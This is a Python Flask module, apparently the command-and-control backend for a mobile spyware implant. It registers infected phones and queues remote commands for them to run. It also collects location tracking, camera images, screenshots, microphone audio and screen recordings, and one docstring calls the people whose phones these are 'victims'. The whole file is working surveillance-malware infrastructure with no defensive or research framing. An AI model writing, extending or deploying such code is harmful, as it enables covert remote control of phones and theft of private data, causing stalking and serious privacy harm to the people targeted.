"""P3.4 -- mobile implant + admin (/api/mobile/*)"""
from __future__ import annotations

import os, json, base64
import uuid as uuid_module
from datetime import datetime, timedelta
from functools import wraps
from flask import (Blueprint, request, jsonify, redirect, url_for, render_template, send_from_directory, make_response, session, Response)
from app.state import *  # noqa: F401,F403  -- P3
from app.state import BASE_DIR, CONFIG, STORE, _decode_data_url, _save_mobile_capture
from app.services import mobile as mobilesvc
import database as db  # legacy sibling module

import platform
bp = Blueprint("capture_mobile", __name__,
               template_folder=os.path.join(BASE_DIR, "flask_templates"))


@bp.route('/api/mobile/register', methods=['POST'])
def mobile_register():
    """Register a new mobile client"""
    data = request.json
    uid = data.get('uid')
    info = data.get('info', {})

    if not uid:
        return jsonify({'error': 'No uid provided'}), 400

    # P4.3: persistence + memory session + notification via service
    mobilesvc.register_client(uid, info, request.remote_addr)

    return jsonify({'status': 'registered'})

@bp.route('/api/mobile/poll', methods=['POST'])
def mobile_poll():
    """Mobile client polls for commands"""
    data = request.json
    uid = data.get('uid')
    
    cmd = mobilesvc.poll(uid)
    if cmd is not None:
        return jsonify({'command': cmd})

    return jsonify({'command': None})

@bp.route('/api/mobile/response', methods=['POST'])
def mobile_response():
    """Mobile client sends command response"""
    data = request.json
    uid = data.get('uid')
    output = data.get('output')
    
    if uid:
        mobilesvc.post_response(uid, output)

    return jsonify({'status': 'received'})

@bp.route('/api/mobile/send_command', methods=['POST'])
def mobile_send_command():
    """Send command to mobile client"""
    data = request.json
    uid = data.get('uid')
    command = data.get('command')
    
    if uid and command:
        mobilesvc.send_command(uid, command)
        return jsonify({'status': 'queued'})
    
    return jsonify({'error': 'Invalid data'}), 400

@bp.route('/api/mobile/get_response/<uid>', methods=['GET'])
def mobile_get_response(uid):
    """Get latest response from mobile client"""
    response = mobilesvc.pop_response(uid)
    if response is not None:
        return jsonify(response)

    return jsonify({'output': None})


# Global tracking data storage
# P3: MOBILE_TRACKING_DATA -> moved to app.state

@bp.route('/api/mobile/background_data', methods=['POST'])
def mobile_background_data():
    """Receive background tracking data from mobile client"""
    data = request.json
    uid = data.get('uid')
    tracking_data = data.get('data')
    
    if uid and tracking_data:
        mobilesvc.add_tracking(uid, tracking_data)
        return jsonify({'status': 'received'})
    
    return jsonify({'error': 'Invalid data'}), 400

@bp.route('/api/mobile/tracking_data/<uid>', methods=['GET'])
def mobile_get_tracking_data(uid):
    """Get tracking data for a specific mobile client"""
    return jsonify({'data': mobilesvc.get_tracking(uid)})

@bp.route('/api/mobile/camera', methods=['POST'])
def mobile_camera():
    """Mobile client sends camera capture"""
    data = request.json
    uid = data.get('uid')
    image_data = data.get('image')
    
    if uid and image_data:
        try:
            fname = mobilesvc.save_camera_capture(uid, image_data)

            return jsonify({'status': 'saved', 'filename': fname})
        except Exception as e:
            return jsonify({'error': str(e)}), 500
    
    return jsonify({'error': 'Invalid data'}), 400

@bp.route('/api/mobile/screenshot', methods=['POST'])
def mobile_screenshot():
    """Mobile client sends a screenshot capture"""
    data = request.get_json(silent=True) or {}
    uid = data.get('uid')
    if not uid:
        return jsonify({'error': 'Invalid data'}), 400
    return _save_mobile_capture(uid, 'screenshot', 'image')

@bp.route('/api/mobile/audio', methods=['POST'])
def mobile_audio():
    """Mobile client sends a microphone recording"""
    data = request.get_json(silent=True) or {}
    uid = data.get('uid')
    if not uid:
        return jsonify({'error': 'Invalid data'}), 400
    return _save_mobile_capture(uid, 'audio', 'audio')

@bp.route('/api/mobile/screen_record', methods=['POST'])
def mobile_screen_record():
    """Mobile client sends a screen recording"""
    data = request.get_json(silent=True) or {}
    uid = data.get('uid')
    if not uid:
        return jsonify({'error': 'Invalid data'}), 400
    return _save_mobile_capture(uid, 'screen_record', 'video')

@bp.route('/api/mobile/captures', methods=['GET'])
def mobile_captures():
    """List media captured from mobile victims (newest first)"""
    uid = request.args.get('uid')
    captures = db.get_mobile_captures(uid=uid)
    return jsonify({'captures': captures, 'count': len(captures)})

@bp.route('/api/mobile/clients', methods=['GET'])
def mobile_clients():
    """Get list of connected mobile clients - LOADS FROM DATABASE!"""
    return jsonify({'clients': mobilesvc.list_clients()})
